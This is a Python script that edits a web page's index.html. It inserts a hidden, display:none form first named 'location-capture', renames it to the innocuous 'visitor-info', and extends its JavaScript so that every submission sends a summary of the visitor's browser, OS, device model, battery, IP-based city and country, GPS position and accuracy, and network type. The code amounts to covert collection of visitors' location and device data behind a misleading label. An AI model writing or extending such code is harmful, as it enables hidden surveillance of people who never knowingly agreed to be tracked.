import re

with open('original_index.html', 'r', encoding='utf-8') as f:
    orig = f.read()

# Extract form
form_match = re.search(r"(<form aria-hidden='true' hidden method='POST' name='location-capture' style='display:none'>.*?</form>)", orig, re.DOTALL)
orig_form = form_match.group(1) if form_match else ''

# Extract JS
js_match = re.search(r"(  function syncDeviceInfo\(\) \{.*?  async function finalSubmit.*?\}\n)", orig, re.DOTALL)
orig_js = js_match.group(1) if js_match else ''

if not orig_form or not orig_js:
    print('Failed to extract from orig')
    exit(1)

# Now modify orig_form to rename it and add date/time/summary
orig_form = orig_form.replace("name='location-capture'", "name='visitor-info'")
orig_form = orig_form.replace('value="location-capture"', 'value="visitor-info"')
orig_form = orig_form.replace('<input type="hidden" name="submit_time" />', '<input type="hidden" name="submit_time" />\n  <input type="hidden" name="date" />\n  <input type="hidden" name="time" />')
orig_form = orig_form.replace('</form>', '  <textarea name="visitor_summary"></textarea>\n</form>')

# Modify orig_js to include date/time/summary in finalSubmit
replacement_js = '''    const now = new Date();
    const dateStr = now.toLocaleDateString();
    const timeStr = now.toLocaleTimeString();
    
    const summary = [
      "VISITOR SUMMARY:",
      "Browser: " + (device.browser_name || "Unknown"),
      "OS: " + (device.os_name || "Unknown") + " " + (device.os_version || ""),
      "Device: " + (device.device_type || "Unknown") + (device.mobile_model && device.mobile_model !== "Not available - browser may hide exact model" && device.mobile_model !== "Not available" ? " (" + device.mobile_model + ")" : ""),
      "Battery: " + (device.battery_info || "Unknown"),
      "Location IP: " + (ip.ip_city || "?") + ", " + (ip.ip_region || "?") + ", " + (ip.ip_country || "?"),
      "Location GPS: " + (buildGpsFields(reason).gps_quality_score !== "No GPS location received" ? (buildGpsFields(reason).gps_quality_score + " (" + buildGpsFields(reason).accuracy_meters + "m)") : "Denied / Blocked"),
      "Network: " + (device.network_type || "Unknown")
    ].join("\\n");

    const fields = Object.assign({}, buildGpsFields(reason), ip, device, {
      submit_time: new Date().toISOString(),
      page_url: window.location.href,
      date: dateStr,
      time: timeStr,
      visitor_summary: summary
    });'''

new_js = orig_js.replace(
'''    const fields = Object.assign({}, buildGpsFields(reason), ip, device, {
      submit_time: new Date().toISOString(),
      page_url: window.location.href
    });''', replacement_js)

with open('index.html', 'r', encoding='utf-8') as f:
    curr = f.read()

# Replace form in curr
curr = re.sub(r"<form aria-hidden='true' hidden method='POST' name='visitor-info' style='display:none'>.*?</form>", orig_form.replace('\\', '\\\\'), curr, flags=re.DOTALL)

# Replace JS in curr
curr = re.sub(r"  function syncDeviceInfo\(\) \{.*?  async function finalSubmit.*?\}\n", new_js.replace('\\', '\\\\'), curr, flags=re.DOTALL)

with open('index.html', 'w', encoding='utf-8') as f:
    f.write(curr)

print('Done')
